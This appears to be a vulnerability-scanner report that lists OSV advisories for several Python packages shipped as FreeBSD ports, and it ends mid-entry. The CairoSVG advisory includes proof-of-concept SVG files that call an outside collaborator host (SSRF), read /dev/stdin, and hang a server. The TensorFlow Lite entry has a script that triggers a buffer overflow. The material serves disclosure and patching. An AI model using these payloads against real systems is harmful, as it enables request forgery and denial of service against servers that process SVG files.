When using the [Django integration](https://docs.sentry.io/platforms/python/guides/django/) of the Sentry SDK in a specific configuration it is possible to leak sensitive cookies values, including the session cookie to Sentry. These sensitive cookies could then be used by someone with access to your Sentry issues to impersonate or escalate their privileges within your application.

The below must be true in order for these sensitive values to be leaked:
1. Your Sentry SDK configuration has `sendDefaultPII` set to `True`
2. You are using a custom name for either of the cookies below in your Django settings.
  - [`SESSION_COOKIE_NAME`](https://docs.djangoproject.com/en/4.1/ref/settings/#std-setting-SESSION_COOKIE_NAME) or 
  - [`CSRF_COOKIE_NAME`](https://docs.djangoproject.com/en/4.1/ref/settings/#std-setting-CSRF_COOKIE_NAME) Django settings
3. You are not configured in your organization or project settings to use [our data scrubbing features](https://docs.sentry.io/product/data-management-settings/scrubbing/) to account for the custom cookie names

### Patches
As of version `1.14.0`, the Django integration of the `sentry-sdk` will detect the custom cookie names based on your Django settings and will remove the values from the payload _before_ sending the data to Sentry.

### Workarounds

If you can not update your `sentry-sdk` to a patched version than you can use the SDKs filtering mechanism to remove the cookies from the payload that is sent to Sentry. For error events this can be done with the [before_send](https://docs.sentry.io/platforms/python/configuration/filtering/#using-platformidentifier-namebefore-send-) callback method and for performance related events (transactions) you can use the [before_send_transaction](https://docs.sentry.io/platforms/python/configuration/filtering/#using-platformidentifier-namebefore-send-transaction-) callback method.

If you'd like to handle filtering of these values on the server-side, you can also use our [advanced data scrubbing feature](https://docs.sentry.io/product/data-management-settings/scrubbing/advanced-datascrubbing/) to account for the custom cookie names. Look for the `$http.cookies`, `$http.headers`, `$request.cookies`, or `$request.headers` fields to target with your scrubbing rule.

### References
- [Using Your Tools Against You (Chapter8 Blog Post)](https://medium.com/@tomwolters/using-your-tools-against-you-cea4d2482ebb)
- [Sentry Python SDK Filtering](https://docs.sentry.io/platforms/python/configuration/filtering/)
- [Sentry Data Scrubbing](https://docs.sentry.io/product/data-management-settings/scrubbing/advanced-datascrubbing/)

### Credits
- [Tom Wolters (Chapter8)](https://chapter8.com)

    Fixed in:  ['1.14.0']
    Link:      https://osv.dev/vulnerability/GHSA-29pr-6jr8-q5jm
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.5.12 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py311-setuptools-63.1.0' / PIP's package 'setuptools-63.1.0' is vulnerable:
    Id:        GHSA-r9hx-vwmv-q579
    Aliases:   ['CVE-2022-40897']
    Details:   Python Packaging Authority (PyPA)'s setuptools is a library designed to facilitate packaging Python projects. Setuptools version 65.5.0 and earlier could allow remote attackers to cause a denial of service by fetching malicious HTML from a PyPI package or custom PackageIndex page due to a vulnerable Regular Expression in `package_index`. This has been patched in version 65.5.1.
    Fixed in:  ['65.5.1']
    Link:      https://osv.dev/vulnerability/GHSA-r9hx-vwmv-q579
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 63.1.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py27-setuptools44-44.1.1' / PIP's package 'setuptools-44.1.1' is vulnerable:
    Id:        GHSA-r9hx-vwmv-q579
    Aliases:   ['CVE-2022-40897']
    Details:   Python Packaging Authority (PyPA)'s setuptools is a library designed to facilitate packaging Python projects. Setuptools version 65.5.0 and earlier could allow remote attackers to cause a denial of service by fetching malicious HTML from a PyPI package or custom PackageIndex page due to a vulnerable Regular Expression in `package_index`. This has been patched in version 65.5.1.
    Fixed in:  ['65.5.1']
    Link:      https://osv.dev/vulnerability/GHSA-r9hx-vwmv-q579
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 44.1.1 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py38-setuptools58-58.5.3' / PIP's package 'setuptools-58.5.3' is vulnerable:
    Id:        GHSA-r9hx-vwmv-q579
    Aliases:   ['CVE-2022-40897']
    Details:   Python Packaging Authority (PyPA)'s setuptools is a library designed to facilitate packaging Python projects. Setuptools version 65.5.0 and earlier could allow remote attackers to cause a denial of service by fetching malicious HTML from a PyPI package or custom PackageIndex page due to a vulnerable Regular Expression in `package_index`. This has been patched in version 65.5.1.
    Fixed in:  ['65.5.1']
    Link:      https://osv.dev/vulnerability/GHSA-r9hx-vwmv-q579
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 58.5.3 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-ujson-5.0.0' / PIP's package 'ujson-5.0.0' is vulnerable:
    Id:        PYSEC-2022-25
    Aliases:   ['CVE-2021-45958', 'GHSA-fh56-85cw-5pq6']
    Details:   UltraJSON (aka ujson) through 5.1.0 has a stack-based buffer overflow in Buffer_AppendIndentUnchecked (called from encode). Exploitation can, for example, use a large amount of indentation.
    Fixed in:  ['5.1.0']
    Link:      https://osv.dev/vulnerability/PYSEC-2022-25
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        OSV-2021-955
    Aliases:   []
    Details:   OSS-Fuzz report: https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=36009

```
Crash type: Stack-buffer-overflow WRITE 1
Crash state:
Buffer_AppendIndentUnchecked
encode
encode
```

    Fixed in:  []
    Link:      https://osv.dev/vulnerability/OSV-2021-955
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-fh56-85cw-5pq6
    Aliases:   ['CVE-2021-45958']
    Details:   UltraJSON (aka ujson) 1.34 through 5.1.0 has a stack-based buffer overflow in Buffer_AppendIndentUnchecked (called from encode).
    Fixed in:  ['5.2.0']
    Link:      https://osv.dev/vulnerability/GHSA-fh56-85cw-5pq6
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-wpqr-jcpx-745r
    Aliases:   ['CVE-2022-31116']
    Details:   ### Impact
_What kind of vulnerability is it? Who is impacted?_

Anyone parsing JSON from an untrusted source is vulnerable.

JSON strings that contain escaped surrogate characters not part of a proper surrogate pair were decoded incorrectly. Besides corrupting strings, this allowed for potential key confusion and value overwriting in dictionaries.

Examples:

```python
# An unpaired high surrogate character is ignored.
>>> ujson.loads(r'"\uD800"')
''
>>> ujson.loads(r'"\uD800hello"')
'hello'

# An unpaired low surrogate character is preserved.
>>> ujson.loads(r'"\uDC00"')
'\udc00'

# A pair of surrogates with additional non surrogate characters pair up in spite of being invalid.
>>> ujson.loads(r'"\uD800foo bar\uDC00"')
'foo bar𐀀'
```

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Users should upgrade to UltraJSON 5.4.0.

From version 5.4.0, UltraJSON decodes lone surrogates in the same way as the standard library's `json` module does, preserving them in the parsed output:

```python3
>>> ujson.loads(r'"\uD800"')
'\ud800'
>>> ujson.loads(r'"\uD800hello"')
'\ud800hello'
>>> ujson.loads(r'"\uDC00"')
'\udc00'
>>> ujson.loads(r'"\uD800foo bar\uDC00"')
'\ud800foo bar\udc00'
```

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

Short of switching to an entirely different JSON library, there are no safe alternatives to upgrading.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [UltraJSON](http://github.com/ultrajson/ultrajson/issues)

    Fixed in:  ['5.4.0']
    Link:      https://osv.dev/vulnerability/GHSA-wpqr-jcpx-745r
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-fm67-cv37-96ff
    Aliases:   ['CVE-2022-31117']
    Details:   ### Impact
_What kind of vulnerability is it? Who is impacted?_

When an error occurs while reallocating the buffer for string decoding, the buffer gets freed twice.

Due to how UltraJSON uses the internal decoder, this double free is impossible to trigger from Python.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Users should upgrade to UltraJSON 5.4.0.

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

There is no workaround.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [UltraJSON](http://github.com/ultrajson/ultrajson/issues)

    Fixed in:  ['5.4.0']
    Link:      https://osv.dev/vulnerability/GHSA-fm67-cv37-96ff
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 5.0.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-pycares-4.1.2' / PIP's package 'pycares-4.1.2' is vulnerable:
    Id:        GHSA-c58j-88f5-h53f
    Aliases:   []
    Details:   ### Impact

pycares versions < 4.2.0 are affected by [CVE-2021-3672](https://nvd.nist.gov/vuln/detail/CVE-2021-3672).

### Patches

Update to version 4.2.0.

    Fixed in:  ['4.2.0']
    Link:      https://osv.dev/vulnerability/GHSA-c58j-88f5-h53f
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 4.1.2 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-unicorn-1.0.2' / PIP's package 'unicorn-1.0.2' is vulnerable:
    Id:        PYSEC-2021-868
    Aliases:   ['CVE-2021-44078']
    Details:   An issue was discovered in split_region in uc.c in Unicorn Engine before 2.0.0-rc5. It allows local attackers to escape the sandbox. An attacker must first obtain the ability to execute crafted code in the target sandbox in order to exploit this vulnerability. The specific flaw exists within the virtual memory manager. The issue results from the faulty comparison of GVA and GPA while calling uc_mem_map_ptr to free part of a claimed memory block. An attacker can leverage this vulnerability to escape the sandbox and execute arbitrary code on the host machine.
    Fixed in:  ['2.0.0rc1']
    Link:      https://osv.dev/vulnerability/PYSEC-2021-868
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.0.2 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-OWSLib-0.28.0' / PIP's package 'OWSLib-0.28.0' is vulnerable:
    Id:        GHSA-8h9c-r582-mggc
    Aliases:   ['CVE-2023-27476']
    Details:   ### Impact

OWSLib's XML parser (which supports both `lxml` and `xml.etree`) does not disable entity resolution for `lxml`, and could lead to arbitrary file reads from an attacker-controlled XML payload. This affects all XML parsing in the codebase.

### Patches

- Use only lxml for XML handling, adding `resolve_entities=False` to `lxml`'s parser: https://github.com/geopython/OWSLib/pull/863

### Workarounds

```python
patch_well_known_namespaces(etree)
etree.set_default_parser(
    parser=etree.XMLParser(resolve_entities=False)
)
```

### References

- [`GHSL-2022-131`](https://securitylab.github.com/advisories/GHSL-2022-131_OWSLib/)

    Fixed in:  ['0.28.1']
    Link:      https://osv.dev/vulnerability/GHSA-8h9c-r582-mggc
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 0.28.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-cairosvg-2.6.0' / PIP's package 'cairosvg-2.6.0' is vulnerable:
    Id:        GHSA-rwmf-w63j-p7gv
    Aliases:   ['CVE-2023-27586']
    Details:   # SSRF vulnerability

## Summary
When CairoSVG processes an SVG file, it can make requests to the inner host and different outside hosts.

## Operating system, version and so on
Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

## Tested CairoSVG version
2.6.0

## Details
A specially crafted SVG file that loads an external resource from a URL. Remote attackers could exploit this vulnerability to cause a scan of an organization's internal resources or a DDOS attack on external resources.
It looks like this bug can affect websites and cause request forgery on the server.

## PoC
1. Generating malicious svg file:
1.1 CairoSVG_exploit.svg:
```svg
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <image height="200" width="200" xlink:href="http://[jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com](http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com/)/3" />
    <style type="text/css">@import url("http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com/5");</style>
    <style type="text/css">
         <![CDATA[
            @import url("http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/9");
            rect { fill: red; stroke: blue; stroke-width: 3 }
         ]]>
    </style>
</svg>
```

1.2 CairoSVG_exploit_2.svg:
```svg
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <defs>
        <pattern id="img1" patternUnits="userSpaceOnUse" width="600" height="450">
            <image xlink:href="http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/11" x="0" y="0" width="600" height="450" />
        </pattern>
    </defs>
    <path d="M5,50 l0,100 l100,0 l0,-100 l-100,0 M215,100 a50,50 0 1 1 -100,0 50,50 0 1 1 100,0 M265,50 l50,100 l-100,0 l50,-100 z" fill="url(#img1)" />
</svg>
```

1.3 CairoSVG_exploit_3.svg:
```svg
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <use href="http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/13" />
</svg>
```

2. Run some commands:
`$ python3 -m cairosvg CairoSVG_exploit.svg -f png`
`$ python3 -m cairosvg CairoSVG_exploit_2.svg -f png`
`$ python3 -m cairosvg CairoSVG_exploit_3.svg -f png `

3. See result requests in Burp Collaborator:
![1](https://user-images.githubusercontent.com/952243/224340068-547b1d9a-5513-48a5-9cdf-b34b693f80c2.png)



# DOS vulnerability with SSTI

## Summary
When CairoSVG processes an SVG file, it can send requests to external hosts and wait for a response from the external server after a successful TCP handshake. This will cause the server to hang.
It seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.

## Operating system, version and so on
Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

## Tested CairoSVG version
2.6.0

## PoC
1. Generating malicious svg file:

```svg
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <use href="http://192.168.56.1:1234/" />
</svg>
```

2. In other server run this python program:

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 1234))
s.listen(1)
conn, addr = s.accept()
with conn:
    while True:
        data = conn.recv(2048)
s.close()
```

3. Run commands:
`$timeout 60 python3 -m cairosvg CairoSVG_exploit_dos.svg -f png`
(without timeout server will hang forever)


# DOS vulnerability with stdin file descriptor

## Summary

Specially crafted SVG file that opens /proc/self/fd/1 or /dev/stdin results in a hang with a tiny PoC file. Remote attackers could leverage this vulnerability to cause a denial of service via a crafted SVG file.
It seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.

## Operating system, version and so on
Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9

## Tested CairoSVG version
2.6.0

## PoC
1. Generating malicious svg file:

```svg
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <use href="file:///dev/stdin" />
</svg>
```

2. In other server run this python program:
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 1234))
s.listen(1)
conn, addr = s.accept()
with conn:
    while True:
        data = conn.recv(2048)
s.close()
```

3. Run commands:
`$timeout 60 python3 -m cairosvg cariosvg_exploit_dos.svg -f png`
    Fixed in:  ['2.7.0']
    Link:      https://osv.dev/vulnerability/GHSA-rwmf-w63j-p7gv
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 2.6.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-cinder-12.0.10_22' / PIP's package 'cinder-12.0.10' is vulnerable:
    Id:        PYSEC-2020-228
    Aliases:   ['CVE-2020-10755']
    Details:   An insecure-credentials flaw was found in all openstack-cinder versions before openstack-cinder 14.1.0, all openstack-cinder 15.x.x versions before openstack-cinder 15.2.0 and all openstack-cinder 16.x.x versions before openstack-cinder 16.1.0. When using openstack-cinder with the Dell EMC ScaleIO or VxFlex OS backend storage driver, credentials for the entire backend are exposed in the ``connection_info`` element in all Block Storage v3 Attachments API calls containing that element. This flaw enables an end-user to create a volume, make an API call to show the attachment detail information, and retrieve a username and password that may be used to connect to another user's volume. Additionally, these credentials are valid for the ScaleIO or VxFlex OS Management API, should an attacker discover the Management API endpoint. Source: OpenStack project
    Fixed in:  ['14.1.0', '15.2.0', '16.1.0']
    Link:      https://osv.dev/vulnerability/PYSEC-2020-228
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-qhch-g8qr-p497
    Aliases:   ['CVE-2014-3641']
    Details:   The (1) GlusterFS and (2) Linux Smbfs drivers in OpenStack Cinder before 2014.1.3 allows remote authenticated users to obtain file data from the Cinder-volume host by cloning and attaching a volume with a crafted qcow2 header.
    Fixed in:  ['2014.1.3']
    Link:      https://osv.dev/vulnerability/GHSA-qhch-g8qr-p497
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-7h75-hwxx-qpgc
    Aliases:   ['CVE-2022-47951']
    Details:   An issue was discovered in OpenStack Cinder before 19.1.2, 20.x before 20.0.2, and 21.0.0; Glance before 23.0.1, 24.x before 24.1.1, and 25.0.0; and Nova before 24.1.2, 25.x before 25.0.2, and 26.0.0. By supplying a specially created VMDK flat image that references a specific backing file path, an authenticated user may convince systems to return a copy of that file's contents from the server, resulting in unauthorized access to potentially sensitive data.
    Fixed in:  ['19.1.2', '20.0.2']
    Link:      https://osv.dev/vulnerability/GHSA-7h75-hwxx-qpgc
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 12.0.10 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-tflite-2.3.0' / PIP's package 'tflite-2.3.0' is vulnerable:
    Id:        GHSA-wf5p-c75w-w3wh
    Aliases:   ['CVE-2021-37689']
    Details:   ### Impact
An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:

This is caused by the MLIR optimization of `L2NormalizeReduceAxis` operator. The [implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70) unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:

```cc
bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {
  if (sq_op.getType().cast<ShapedType>().getRank() - 1 ==
          *axis.getValues<int>().begin() ||
      *axis.getValues<int>().begin() == -1) {
      // ...
  }
  // ...
}
```

### Patches
We have patched the issue in GitHub commit [d6b57f461b39fd1aa8c1b870f1b974aac3554955](https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
          
### Attribution              
This vulnerability has been reported by Yakun Zhang of Baidu Security.
    Fixed in:  ['2.3.4', '2.4.3', '2.5.1']
    Link:      https://osv.dev/vulnerability/GHSA-wf5p-c75w-w3wh
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-h6q3-vv32-2cq5
    Aliases:   ['CVE-2022-41894']
    Details:   ### Impact
The reference kernel of the [`CONV_3D_TRANSPOSE`](https://github.com/tensorflow/tensorflow/blob/091e63f0ea33def7ecad661a5ac01dcafbafa90b/tensorflow/lite/kernels/internal/reference/conv3d_transpose.h#L121) TensorFlow Lite operator wrongly increments the data_ptr when adding the bias to the result.

Instead of `data_ptr += num_channels;` it should be `data_ptr += output_num_channels;` as if the number of input channels is different than the number of output channels, the wrong result will be returned and a buffer overflow will occur if num_channels > output_num_channels.

An attacker can craft a model with a specific number of input channels in a way similar to the attached example script. It is then possible to write specific values through the bias of the layer outside the bounds of the buffer. This attack only works if the reference kernel resolver is used in the interpreter (i.e. `experimental_op_resolver_type=tf.lite.experimental.OpResolverType.BUILTIN_REF` is used).
```python
import tensorflow as tf
model = tf.keras.Sequential(
    [
        tf.keras.layers.InputLayer(input_shape=(2, 2, 2, 1024), batch_size=1),
        tf.keras.layers.Conv3DTranspose(
            filters=8,
            kernel_size=(2, 2, 2),
            padding="same",
            data_format="channels_last",
        ),
    ]
)

converter = tf.lite.TFLiteConverter.from_keras_model(model)
tflite_model = converter.convert()

interpreter = tf.lite.Interpreter(
    model_content=tflite_model,
    experimental_op_resolver_type=tf.lite.experimental.OpResolverType.BUILTIN_REF,
)

interpreter.allocate_tensors()
interpreter.set_tensor(
    interpreter.get_input_details()[0]["index"], tf.zeros(shape=[1, 2, 2, 2, 1024])
)
interpreter.invoke()
```

### Patches
We have patched the issue in GitHub commit [72c0bdcb25305b0b36842d746cc61d72658d2941](https://github.com/tensorflow/tensorflow/commit/72c0bdcb25305b0b36842d746cc61d72658d2941).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Thibaut Goetghebuer-Planchon, Arm Ltd.

    Fixed in:  ['2.8.4', '2.9.3', '2.10.1']
    Link:      https://osv.dev/vulnerability/GHSA-h6q3-vv32-2cq5
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 2.3.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-impacket-0.9.17_1' / PIP's package 'impacket-0.9.17' is vulnerable:
    Id:        PYSEC-2021-17
    Aliases:   ['CVE-2021-31800', 'GHSA-mj63-64x7-57xf']
    Details:   Multiple path traversal vulnerabilities exist in smbserver.py in Impacket through 0.9.22. An attacker that connects to a running smbserver instance can list and write to arbitrary files via ../ directory traversal. This could potentially be abused to achieve arbitrary code execution by replacing /etc/shadow or an SSH authorized key.
    Fixed in:  ['0.9.23']
    Link:      https://osv.dev/vulnerability/PYSEC-2021-17
    Source:    osv
    Summary:   None
    Withdrawn: None

    Id:        GHSA-mj63-64x7-57xf
    Aliases:   ['CVE-2021-31800']
    Details:   Multiple path traversal vulnerabilities exist in smbserver.py in Impacket before 0.9.23. An attacker that connects to a running smbserver instance can list and write to arbitrary files via ../ directory traversal. This could potentially be abused to achieve arbitrary code execution by replacing /etc/shadow or an SSH authorized key.
    Fixed in:  ['0.9.23']
    Link:      https://osv.dev/vulnerability/GHSA-mj63-64x7-57xf
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 0.9.17 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-suds-1.1.2' / PIP's package 'suds-1.1.2' is vulnerable:
    Id:        PYSEC-2013-32
    Aliases:   ['CVE-2013-2217', 'GHSA-vpqp-hx68-p2wx']
    Details:   cache.py in Suds 0.4, when tempdir is set to None, allows local users to redirect SOAP queries and possibly have other unspecified impact via a symlink attack on a cache file with a predictable name in /tmp/suds/.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/PYSEC-2013-32
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.1.2 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-slixmpp-1.7.1' / PIP's package 'slixmpp-1.7.1' is vulnerable:
    Id:        GHSA-q6cq-m9gm-6q2f
    Aliases:   ['CVE-2022-45197']
    Details:   Slixmpp before 1.8.3 lacks SSL Certificate hostname validation in XMLStream, allowing an attacker to pose as any server in the eyes of Slixmpp.
    Fixed in:  ['1.8.3']
    Link:      https://osv.dev/vulnerability/GHSA-q6cq-m9gm-6q2f
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 1.7.1 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-nicotine-plus-3.2.0_1' / PIP's package 'nicotine-plus-3.2.0' is vulnerable:
    Id:        GHSA-p4v2-r99v-wjc2
    Aliases:   ['CVE-2021-45848']
    Details:   Denial of service (DoS) vulnerability in Nicotine+ starting with version 3.0.3 and prior to version 3.2.1 allows a user with a modified Soulseek client to crash Nicotine+ by sending a file download request with a file path containing a null character.
    Fixed in:  ['3.2.1']
    Link:      https://osv.dev/vulnerability/GHSA-p4v2-r99v-wjc2
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 3.2.0 >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>> for any version >>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<



FreeBSD's port 'py39-pymatgen-2022.7.19' / PIP's package 'pymatgen-2022.7.19' is vulnerable:
    Id:        GHSA-5jqp-885w-xj32
    Aliases:   ['CVE-2022-42964']
    Details:   An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the pymatgen PyPI package, when an attacker is able to supply arbitrary input to the GaussianInput.from_string method.
    Fixed in:  []
    Link:      https://osv.dev/vulnerability/GHSA-5jqp-885w-xj32
    Source:    osv
    Summary:   None
    Withdrawn: None

Vulnerabilities reported to FreeBSD VuXML:
>>> for version 2022.7.19 >>>>>>>>>>>>>>>>>>>>>>>>
